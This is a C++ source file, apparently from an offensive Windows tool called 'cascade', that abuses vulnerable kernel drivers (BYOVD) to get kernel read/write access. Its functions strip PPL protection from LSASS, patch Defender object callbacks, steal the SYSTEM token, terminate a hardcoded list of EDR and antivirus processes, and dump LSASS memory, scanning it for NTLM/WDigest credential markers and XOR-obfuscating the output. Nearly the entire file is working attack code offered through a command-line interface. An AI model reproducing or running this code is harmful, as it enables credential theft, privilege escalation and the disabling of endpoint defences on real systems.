    memcpy(regionHdr.magic, "CASCRAW\0", 8);

    // Needle: UTF-16 "NTLM" appears in WDigest credential blocks
    const BYTE needle[] = { 'N',0,'T',0,'L',0,'M',0 };

    QWORD addr = 0x10000;
    MEMORY_BASIC_INFORMATION mbi{};
    SIZE_T retLen = 0;
    int regions = 0, hits = 0;

    while (addr < 0x7FFFFFFFFFFF00ULL) {
        NTSTATUS st = NtQVM(hProc, (PVOID)addr, 0 /*MemoryBasicInformation*/,
                            &mbi, sizeof(mbi), &retLen);
        if (!NT_SUCCESS(st)) break;
        if (mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE &&
            (mbi.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE))) {
            // Read this region via physical (bypasses Defender VM_READ interception)
            SIZE_T rsz = mbi.RegionSize;
            if (rsz > 16ULL * 1024 * 1024) rsz = 16ULL * 1024 * 1024; // cap 16MB
            std::vector<BYTE> rbuf(rsz, 0);
            if (PhysReadProcessMemory(cr3, (QWORD)mbi.BaseAddress, rbuf.data(), rsz)) {
                // Write region header + data
                regionHdr.va = (QWORD)mbi.BaseAddress;
                regionHdr.size = rsz;
                DWORD w = 0;
                WriteFile(hOut, &regionHdr, sizeof(regionHdr), &w, nullptr);
                WriteFile(hOut, rbuf.data(), (DWORD)rsz, &w, nullptr);
                regions++;

                // Scan for NTLM needle
                for (SIZE_T i = 0; i + sizeof(needle) < rsz; i++) {
                    if (memcmp(&rbuf[i], needle, sizeof(needle)) == 0) {
                        hits++;
                        printf("[+] NTLM marker at LSASS VA 0x%llX (file offset +%zu)\n",
                               (QWORD)mbi.BaseAddress + i, i);
                        if (hits > 32) goto done;
                    }
                }
            }
        }
        addr = (QWORD)mbi.BaseAddress + mbi.RegionSize;
    }
done:
    CloseHandle(hProc);
    CloseHandle(hOut);
    printf("[+] Kernel-direct dump: %d regions captured, %d NTLM markers found -> %s\n",
           regions, hits, outPath);
    return true;
}

// ---------------------------------------------------------------------------
// PPL strip
// ---------------------------------------------------------------------------
struct PplResult { bool ok; QWORD eproc; BYTE before; char name[16]; };

static PplResult StripPpl(QWORD sysEproc, DWORD pid, bool dryRun) {
    PplResult r{};
    r.eproc = FindEprocessByPid(sysEproc, pid, r.name);
    if (!r.eproc) { printf("[-] PID %lu not found\n", pid); return r; }
    printf("[+] Target EPROCESS: 0x%llX (%s)\n", r.eproc, r.name);

    ScanAndFixOffsets(r.eproc, pid);

    // Read code-integrity bytes (informational only - do NOT zero SignatureLevel/SectionSignatureLevel
    // as that triggers CRITICAL_PROCESS_DIED on live LSASS; use --patch-callbacks instead)
    BYTE sigLevel = 0, secSigLevel = 0;
    KRead(r.eproc + g_off.Protection - 2, &sigLevel,    1);
    KRead(r.eproc + g_off.Protection - 1, &secSigLevel, 1);
    KRead(r.eproc + g_off.Protection,     &r.before,    1);
    printf("[*] SignatureLevel=0x%02X  SectionSignatureLevel=0x%02X  Protection=0x%02X\n",
           sigLevel, secSigLevel, r.before);

    if (dryRun) { printf("[dry-run] Skipping write\n"); r.ok = true; return r; }

    if (r.before == 0) { printf("[!] Protection already 0x00\n"); r.ok = true; return r; }

    BYTE zero = 0;
    if (!KWrite(r.eproc + g_off.Protection, &zero, 1)) {
        printf("[-] KWrite Protection failed (%lu)\n", GetLastError()); return r;
    }
    BYTE after = 0xFF;
    KRead(r.eproc + g_off.Protection, &after, 1);
    if (after != 0) { printf("[-] Write issued but Protection=0x%02X\n", after); return r; }
    printf("[!!!] Protection byte cleared (0x%02X -> 0x00)\n", r.before);
    r.ok = true;
    return r;
}

// ---------------------------------------------------------------------------
// LSASS dump (from warp.cpp)
// ---------------------------------------------------------------------------
static DWORD FindPidByName(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe{}; pe.dwSize = sizeof(pe);
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) do {
        char nm[MAX_PATH]{};
        WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, nm, sizeof(nm), nullptr, nullptr);
        if (_stricmp(nm, name) == 0) { pid = pe.th32ProcessID; break; }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return pid;
}

static std::atomic<unsigned long long> g_dumpBytes(0);
static LPVOID g_dumpBuf = nullptr;
static QWORD  g_dumpBufSz = 0;

static BOOL CALLBACK DumpCb(PVOID, MINIDUMP_CALLBACK_INPUT* in, MINIDUMP_CALLBACK_OUTPUT* out) {
    switch (in->CallbackType) {
    case IoStartCallback:  out->Status = S_FALSE; return TRUE;
    case IoWriteAllCallback: {
        // MINIDUMP_CALLBACK_INPUT layout (x64):
        //   +0x00: ProcessId (ULONG, 4)
        //   +0x04: ProcessHandle (HANDLE, 8)
        //   +0x0C: CallbackType (ULONG, 4)
        //   +0x10: union { Io ... }  ← union starts here at 16
        // MINIDUMP_IO_CALLBACK:
        //   +0x00: FileHandle (HANDLE, 8)
        //   +0x08: Offset (ULONG64, 8)
        //   +0x10: Buffer (PVOID, 8)
        //   +0x18: BufferBytes (ULONG, 4)
        BYTE* u = (BYTE*)in + sizeof(ULONG) + sizeof(HANDLE) + sizeof(ULONG);  // = 16
        UINT64 offset = *(UINT64*)(u + 8);
        LPVOID buffer = *(LPVOID*)(u + 16);
        ULONG  bytes  = *(ULONG*)(u + 24);
        if (offset + bytes > g_dumpBufSz) { out->Status = E_OUTOFMEMORY; return TRUE; }
        memcpy((BYTE*)g_dumpBuf + offset, buffer, bytes);
        g_dumpBytes.fetch_add(bytes);
        out->Status = S_OK; return TRUE;
    }
    case IoFinishCallback: out->Status = S_OK; return TRUE;
    }
    return TRUE;
}

static bool DumpLsass(DWORD pid, const char* outPath, bool noXor) {
    EnablePrivilege("SeDebugPrivilege");

    typedef NTSTATUS(WINAPI* NtSP_t)(HANDLE);
    auto NtSP = (NtSP_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSuspendProcess");
    auto NtRP = (NtSP_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtResumeProcess");

    HANDLE hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hTarget) { printf("[-] OpenProcess %lu failed (%lu)\n", pid, GetLastError()); return false; }

    // Quick ReadProcessMemory test to verify handle access before suspending
    {
        MEMORY_BASIC_INFORMATION mbi{};
        SIZE_T bytesRead = 0;
        BYTE testBuf[16]{};
        if (VirtualQueryEx(hTarget, (LPCVOID)0x10000, &mbi, sizeof(mbi))) {
            ReadProcessMemory(hTarget, mbi.BaseAddress, testBuf, 16, &bytesRead);
        }
        printf("[*] RPM test: bytesRead=%zu (handle %s)\n", bytesRead,
               bytesRead > 0 ? "OK" : "BLOCKED/EMPTY");
    }

    // Suspend via process handle (uses PROCESS_SUSPEND_RESUME, not per-thread THREAD_SUSPEND_RESUME)
    if (NtSP) {
        NTSTATUS st = NtSP(hTarget);
        printf("[*] NtSuspendProcess: 0x%lX\n", (ULONG)st);
    }

    HANDLE hOut = CreateFileA(outPath, GENERIC_WRITE, FILE_SHARE_READ, nullptr,
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hOut == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile %s failed (%lu)\n", outPath, GetLastError());
        if (NtRP) NtRP(hTarget);
        CloseHandle(hTarget);
        return false;
    }

    printf("[*] MiniDumpWriteDump PID=%lu (type=0x200 PrivateReadWrite)...\n", pid);
    BOOL ok = MiniDumpWriteDump(hTarget, pid, hOut, (MINIDUMP_TYPE)0x200,
                                nullptr, nullptr, nullptr);
    DWORD err = GetLastError();

    FlushFileBuffers(hOut);
    CloseHandle(hOut);

    if (NtRP) NtRP(hTarget);
    CloseHandle(hTarget);

    if (!ok) {
        printf("[-] MiniDumpWriteDump failed, GLE=%lu\n", err);
        return false;
    }

    LARGE_INTEGER sz{};
    HANDLE hCheck = CreateFileA(outPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                                nullptr, OPEN_EXISTING, 0, nullptr);
    if (hCheck != INVALID_HANDLE_VALUE) {
        GetFileSizeEx(hCheck, &sz);
        CloseHandle(hCheck);
    }
    printf("[!!!] Dump written to %s (%lld bytes)\n", outPath, sz.QuadPart);
    return sz.QuadPart > 0;
}

// Direct ReadProcessMemory scan - no thread suspension required
static bool DumpRpm(DWORD pid, const char* outPath) {
    EnablePrivilege("SeDebugPrivilege");
    HANDLE hTarget = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hTarget) { printf("[-] OpenProcess PROCESS_VM_READ failed (%lu)\n", GetLastError()); return false; }

    FILE* fOut = fopen(outPath, "wb");
    if (!fOut) { printf("[-] fopen %s failed\n", outPath); CloseHandle(hTarget); return false; }

    MEMORY_BASIC_INFORMATION mbi{};
    BYTE* addr = nullptr;
    SIZE_T totalBytes = 0, regions = 0;
    printf("[*] DumpRpm: scanning LSASS virtual memory...\n");
    while (VirtualQueryEx(hTarget, addr, &mbi, sizeof(mbi))) {
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & PAGE_GUARD) == 0 &&
            (mbi.Protect & PAGE_NOACCESS) == 0) {
            std::vector<BYTE> buf(mbi.RegionSize);
            SIZE_T bytesRead = 0;
            if (ReadProcessMemory(hTarget, mbi.BaseAddress, buf.data(), mbi.RegionSize, &bytesRead) && bytesRead > 0) {
                // Write record: [addr 8B][size 8B][data N]
                QWORD base = (QWORD)mbi.BaseAddress;
                QWORD sz   = bytesRead;
                fwrite(&base, 8, 1, fOut);
                fwrite(&sz,   8, 1, fOut);
                fwrite(buf.data(), 1, bytesRead, fOut);
                totalBytes += bytesRead;
                regions++;
            }
        }
        addr = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
        if ((QWORD)addr < (QWORD)mbi.BaseAddress) break;
    }
    fflush(fOut);
    fclose(fOut);
    CloseHandle(hTarget);
    printf("[*] DumpRpm: %zu regions, %zu bytes -> %s\n", regions, totalBytes, outPath);
    return totalBytes > 0;
}

// ---------------------------------------------------------------------------
// EDR kill (simplified from UsingBYOVD DriverLoader.cpp KillAllAvOrEdr)
// ---------------------------------------------------------------------------
static const char* kEdrProcs[] = {
    "MsMpEng.exe","msmpeng.exe","MsSense.exe","WinDefend.exe",
    "CSFalconService.exe","CSFalconContainer.exe","SentinelAgent.exe","SentinelOne.exe",
    "cb.exe","CbDefense.exe","xagt.exe","bdagent.exe","ekrn.exe","egui.exe",
    "avgui.exe","avguard.exe","avp.exe","ksde.exe",
    "Sysmon.exe","Sysmon64.exe","sysmon.exe",
    "wazuh-agent.exe","ossec-agent.exe",
    "elastic-endpoint.exe","elastic-agent.exe",
    "cyserver.exe","csagent.exe","csfalconservice.exe",
    "mcshield.exe","mfemactl.exe",
    "ns.exe","ntrtscan.exe","pccntmon.exe",
    "SECAgent.exe","cyoptics.exe","CylanceSvc.exe",
    nullptr
};

static void KillEdrs() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe{}; pe.dwSize = sizeof(pe);
    int killed = 0;
    if (Process32FirstW(snap, &pe)) do {
        char nm[MAX_PATH]{};
        WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, nm, sizeof(nm), nullptr, nullptr);
        for (int i = 0; kEdrProcs[i]; i++) {
            if (_stricmp(nm, kEdrProcs[i]) == 0) {
                HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (h) {
                    if (TerminateProcess(h, 1))
                        printf("[+] Killed %s (PID %lu)\n", pe.szExeFile, pe.th32ProcessID), killed++;
                    CloseHandle(h);
                }
            }
        }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    printf("[*] %d EDR process(es) killed\n", killed);
}

// ---------------------------------------------------------------------------
// Decode (XOR undo, validate MDMP)
// ---------------------------------------------------------------------------
static bool DecodeFile(const char* inPath, const char* outPath) {
    HANDLE f = CreateFileA(inPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (f == INVALID_HANDLE_VALUE) { printf("[-] Open %s failed (%lu)\n", inPath, GetLastError()); return false; }
    DWORD sz = GetFileSize(f, nullptr);
    if (sz == INVALID_FILE_SIZE) { CloseHandle(f); return false; }
    BYTE* buf = (BYTE*)VirtualAlloc(nullptr, sz, MEM_COMMIT, PAGE_READWRITE);
    DWORD got = 0;
    if (!ReadFile(f, buf, sz, &got, nullptr) || got != sz) { CloseHandle(f); VirtualFree(buf, 0, MEM_RELEASE); return false; }
    CloseHandle(f);
    for (DWORD i = 0; i < sz; i++) buf[i] ^= 0x55;
    if (sz >= 4 && buf[0]=='M' && buf[1]=='D' && buf[2]=='M' && buf[3]=='P')
        printf("[+] MDMP signature OK\n");
    else
        printf("[!] MDMP signature not found\n");
    HANDLE o = CreateFileA(outPath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (o == INVALID_HANDLE_VALUE) { VirtualFree(buf, 0, MEM_RELEASE); return false; }
    DWORD w = 0;
    WriteFile(o, buf, sz, &w, nullptr);
    CloseHandle(o);
    VirtualFree(buf, 0, MEM_RELEASE);
    printf("[+] Decoded to %s (%lu bytes)\n", outPath, sz);
    return true;
}

// ---------------------------------------------------------------------------
// Test R/W (safe: only reads System EPROCESS, writes nothing)
// ---------------------------------------------------------------------------
static bool TestRw(QWORD sysEproc) {
    printf("[test] Reading System EPROCESS at 0x%llX\n", sysEproc);
    BYTE block[32]{};
    if (!KRead(sysEproc, block, sizeof(block))) {
        printf("[-] KRead System EPROCESS failed\n");
        return false;
    }
    printf("[+] KRead OK. First 16 bytes: ");
    for (int i = 0; i < 16; i++) printf("%02X ", block[i]);
    printf("\n");

    // Read ImageFileName of System (should be "System")
    BYTE name[16]{};
    if (KRead(sysEproc + g_off.ImageFileName, name, 15)) {
        printf("[+] System EPROCESS ImageFileName: %s\n", (char*)name);
    }

    // Read UniqueProcessId of System (should be 4)
    QWORD pid4 = KReadQword(sysEproc + g_off.UniqueProcessId);
    printf("[+] System PID from EPROCESS: %llu (expect 4)\n", pid4);

    printf("[+] R/W test PASSED\n");
    return true;
}

// ---------------------------------------------------------------------------
// Driver init (open or drop+load)
// ---------------------------------------------------------------------------
static bool InitProvider(const Config& cfg) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    g_NtLoadDriver   = (NtLoadDriver_t)  GetProcAddress(ntdll, "NtLoadDriver");
    g_NtUnloadDriver = (NtUnloadDriver_t)GetProcAddress(ntdll, "NtUnloadDriver");

    g_activeProvider = cfg.type;

    if (cfg.type == ProviderType::PdfwKrnl) {
        g_pdfwDev = CreateFileW(L"\\\\.\\Global\\PdFwKrnl",
            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (g_pdfwDev == INVALID_HANDLE_VALUE) {
            printf("[-] Cannot open PdFwKrnl (%lu)\n", GetLastError()); return false;
        }
        printf("[+] PdFwKrnl opened\n");
        return true;
    }

    if (cfg.drvPath.empty()) {
        printf("[-] --driver path required for this provider\n"); return false;
    }

    if (!EnablePrivilege(SE_LOAD_DRIVER_NAME)) {
        printf("[-] SeLoadDriverPrivilege not available\n"); return false;
    }

    // BiosTool
    std::wstring widePath = Utf8ToWide(cfg.drvPath);
    std::wstring dropped;
    if (!CopyDriverToTemp(widePath, dropped)) return false;
    printf("[*] Driver dropped to: %s\n", WideToUtf8(dropped).c_str());

    g_svcName  = SvcNameFromPath(dropped);
    g_regPath  = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\" + g_svcName;
    g_dropPath = dropped;

    if (!CreateDriverService(g_svcName, dropped)) return false;
    if (!LoadDriverViaNt(g_regPath)) {
        DeleteServiceKey(g_svcName);
        DeleteFileW(dropped.c_str());
        return false;
    }

    // Wait briefly for device to appear
    Sleep(300);

    std::wstring devPath = L"\\\\.\\" + g_svcName;
    g_biostoolDev = CreateFileW(devPath.c_str(),
        GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (g_biostoolDev == INVALID_HANDLE_VALUE) {
        // Try standard name for BiosToolCommonDriver
        g_biostoolDev = CreateFileW(L"\\\\.\\BiosToolCommonDriver",
            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    }
    if (g_biostoolDev == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open device %s (%lu)\n",
            WideToUtf8(devPath).c_str(), GetLastError());
        return false;
    }
    printf("[+] Device opened: %s\n", WideToUtf8(devPath).c_str());
    return true;
}

static void CleanupProvider() {
    if (g_biostoolDev != INVALID_HANDLE_VALUE) {
        CloseHandle(g_biostoolDev);
        g_biostoolDev = INVALID_HANDLE_VALUE;
    }
    if (g_pdfwDev != INVALID_HANDLE_VALUE) {
        CloseHandle(g_pdfwDev);
        g_pdfwDev = INVALID_HANDLE_VALUE;
    }
    if (!g_regPath.empty()) {
        UnloadDriverViaNt(g_regPath);
        DeleteServiceKey(g_svcName);
    }
    if (!g_dropPath.empty()) {
        Sleep(500);
        DeleteFileW(g_dropPath.c_str());
    }
}

// ---------------------------------------------------------------------------
// CLI
// ---------------------------------------------------------------------------
static void Usage(const char* prog) {
    printf(
        "cascade - consolidated BYOVD tool (BiosToolCommonDriver + warp)\n\n"
        "usage: %s [options]\n"
        "  --driver PATH        path to vulnerable driver .sys (required unless pdfwkrnl)\n"
        "  --driver-type TYPE   biostool (default), ktapi, pdfwkrnl\n"
        "  --pid N              target PID (default: LSASS)\n"
        "  --test-rw            test kernel R/W (read only, safe)\n"
        "  --dry-run            resolve structures, write nothing\n"
        "  --priv-esc           steal SYSTEM token for current PID (token hijack)\n"
        "  --kill-edr           terminate known AV/EDR processes\n"
        "  --dump --out PATH    strip PPL + dump LSASS to PATH (XOR-obfuscated)\n"
        "  --dump-kernel --out PATH  kernel-direct LSASS scan via CR3 (no OpenProcess VM_READ)\n"
        "  --patch-callbacks    zero out Defender ObCallback PreOperation (requires HVCI=OFF)\n"
        "  --no-xor             write raw minidump (with --dump)\n"
        "  --decode --in PATH --out PATH  undo XOR, validate MDMP\n"
        "  --help\n\n"
        "Safe by default: without --dump/--priv-esc/--kill-edr nothing is modified.\n",
        prog);
}

int main(int argc, char** argv) {
    Config cfg;
    for (int i = 1; i < argc; i++) {
        std::string a = argv[i];
        auto next = [&]() -> const char* { return (i + 1 < argc) ? argv[++i] : ""; };
        if (a == "--help" || a == "-h")      { Usage(argv[0]); return 0; }
        else if (a == "--driver")            cfg.drvPath     = next();
        else if (a == "--out")               cfg.outPath     = next();
        else if (a == "--in")                cfg.inPath      = next();
        else if (a == "--pid")               cfg.targetPid   = (DWORD)atol(next());
        else if (a == "--driver-type") {
            std::string t = next();
            if (t == "biostool")             cfg.type = ProviderType::BiosTool;
            else if (t == "ktapi")           cfg.type = ProviderType::Ktapi;
            else if (t == "pdfwkrnl")        cfg.type = ProviderType::PdfwKrnl;
            else { printf("[-] Unknown driver-type: %s\n", t.c_str()); return 2; }
        }
        else if (a == "--dry-run")           cfg.dryRun    = true;
        else if (a == "--test-rw")           cfg.testRw    = true;
        else if (a == "--priv-esc")          cfg.doPrivEsc = true;
        else if (a == "--kill-edr")          cfg.killEdr   = true;
        else if (a == "--dump")              cfg.doDump       = true;
        else if (a == "--dump-rpm")          cfg.doDumpRpm    = true;
        else if (a == "--dump-kernel")        cfg.doDumpKernel     = true;
        else if (a == "--patch-callbacks")   cfg.doPatchCallbacks = true;
        else if (a == "--decode")            cfg.doDecode     = true;
        else if (a == "--no-xor")            cfg.noXor        = true;
        else { printf("[-] Unknown arg: %s\n", a.c_str()); Usage(argv[0]); return 2; }
    }

    if (cfg.doDecode) {
        if (cfg.inPath.empty() || cfg.outPath.empty()) {
            printf("[-] --decode needs --in and --out\n"); return 2;
        }
        return DecodeFile(cfg.inPath.c_str(), cfg.outPath.c_str()) ? 0 : 1;
    }

    // Resolve build and offsets
    DWORD build = GetWindowsBuild();
    printf("[*] Windows build: %lu\n", build);
    SetOffsetsByBuild(build);

    // Load provider
    if (!InitProvider(cfg)) return 1;

    // Get kernel base + System EPROCESS
    KernelBase kb = GetKernelBase();
    if (!kb.ntosBase || !kb.systemEproc) {
        printf("[-] Failed to locate ntoskrnl base or System EPROCESS\n");
        CleanupProvider(); return 1;
    }
    printf("[*] ntoskrnl: 0x%llX\n", kb.ntosBase);
    printf("[+] System EPROCESS: 0x%llX\n", kb.systemEproc);

    int ret = 0;

    if (cfg.testRw) {
        if (!TestRw(kb.systemEproc)) ret = 1;
        CleanupProvider(); return ret;
    }

    // Resolve target PID
    DWORD pid = cfg.targetPid;
    if (!pid && (cfg.doDump || cfg.dryRun)) {
        pid = FindPidByName("lsass.exe");
        if (!pid) { printf("[-] Cannot find lsass.exe; use --pid\n"); CleanupProvider(); return 1; }
        printf("[*] LSASS PID: %lu\n", pid);
    }

    if (cfg.killEdr) KillEdrs();

    if (cfg.doPatchCallbacks) {
        printf("[*] Patching Defender ObCallback registrations...\n");
        if (!PatchObCallbacks(kb.ntosBase)) ret = 1;
    }

    if (cfg.doPrivEsc) {
        DWORD myPid = GetCurrentProcessId();
        printf("[*] Stealing SYSTEM token for PID %lu (self)\n", myPid);
        if (!TokenSteal(kb.systemEproc, myPid)) ret = 1;
    }

    if (cfg.dryRun) {
        if (!pid) { printf("[-] --dry-run requires a target PID (use --pid or implicit LSASS)\n"); CleanupProvider(); return 2; }
        PplResult r = StripPpl(kb.systemEproc, pid, /*dryRun=*/true);
        if (!r.ok) ret = 1;
        else printf("\n[dry-run] OK. Run with --dump --out <path> to execute.\n");
    }

    if (cfg.doDump) {
        if (cfg.outPath.empty()) { printf("[-] --dump needs --out\n"); CleanupProvider(); return 2; }
        // Auto-patch ObCallbacks so OpenProcess gets PROCESS_ALL_ACCESS on LSASS
        printf("[*] Auto-patching ObCallbacks for dump...\n");
        PatchObCallbacks(kb.ntosBase);
        PplResult r = StripPpl(kb.systemEproc, pid, /*dryRun=*/false);
        if (!r.ok) { CleanupProvider(); return 1; }
        if (!DumpLsass(pid, cfg.outPath.c_str(), cfg.noXor)) ret = 1;
    }

    if (cfg.doDumpRpm) {
        if (cfg.outPath.empty()) { printf("[-] --dump-rpm needs --out\n"); CleanupProvider(); return 2; }
        DWORD rpid = pid;
        if (!rpid) { rpid = FindPidByName("lsass.exe"); printf("[*] LSASS PID: %lu\n", rpid); }
        // Patch Process ObCallbacks so OpenProcess(VM_READ) gets access
        printf("[*] Auto-patching ObCallbacks for RPM dump...\n");
        PatchObCallbacks(kb.ntosBase);
        if (!DumpRpm(rpid, cfg.outPath.c_str())) ret = 1;
    }

    if (cfg.doDumpKernel) {
        if (cfg.outPath.empty()) { printf("[-] --dump-kernel needs --out\n"); CleanupProvider(); return 2; }
        DWORD kpid = pid;
        if (!kpid) {
            kpid = FindPidByName("lsass.exe");
            if (!kpid) { printf("[-] Cannot find lsass.exe; use --pid\n"); CleanupProvider(); return 1; }
            printf("[*] LSASS PID: %lu\n", kpid);
        }
        char nm[16]{};
        QWORD lsassEp = FindEprocessByPid(kb.systemEproc, kpid, nm);
        if (!lsassEp) { printf("[-] LSASS EPROCESS not found\n"); CleanupProvider(); return 1; }
        // KPROCESS.DirectoryTableBase is stable at offset 0x28 across all modern Windows builds
        QWORD cr3 = KReadQword(lsassEp + 0x28);
        printf("[*] LSASS EPROCESS: 0x%llX  CR3: 0x%llX\n", lsassEp, cr3);
        if (!cr3) { printf("[-] CR3 read returned 0 -- kernel R/W may not be working\n"); CleanupProvider(); return 1; }

        // Find user-mode CR3: with KPTI the kernel CR3 (DirectoryTableBase@0x28) has
        // PML4[0]=0 (user-mode not mapped). Try known UserDirectoryTableBase offsets
        // until we find one whose PML4[0] is non-zero (user-mode mapped).
        static const DWORD ucrOffsets[] = { 0x388, 0x280, 0x3B8, 0x028 };
        QWORD useCr3 = cr3;
        for (DWORD off : ucrOffsets) {
            QWORD cand = KReadQword(lsassEp + off);
            if (!cand || cand == cr3) continue;
            QWORD candBase = cand & ~0xFFFULL;
            QWORD pml4_0 = 0;
            if (BiosTool_ReadPhys((PVOID)candBase, 8, &pml4_0) && (pml4_0 & 1)) {
                printf("[*] UserDirectoryTableBase @ 0x%X = 0x%llX (PML4[0]=0x%llX - user-mode mapped)\n", off, cand, pml4_0);
                useCr3 = cand;
                break;
            } else {
                printf("[*] Tried offset 0x%X = 0x%llX: PML4[0]=0x%llX (not suitable)\n", off, cand, pml4_0);
            }
        }
        if (useCr3 == cr3) printf("[!] Using kernel CR3 (user CR3 not found) - scan may miss user-mode pages\n");

        if (!ScanLsassWDigest(lsassEp, useCr3, cfg.outPath.c_str())) ret = 1;
    }

    CleanupProvider();
    return ret;
}
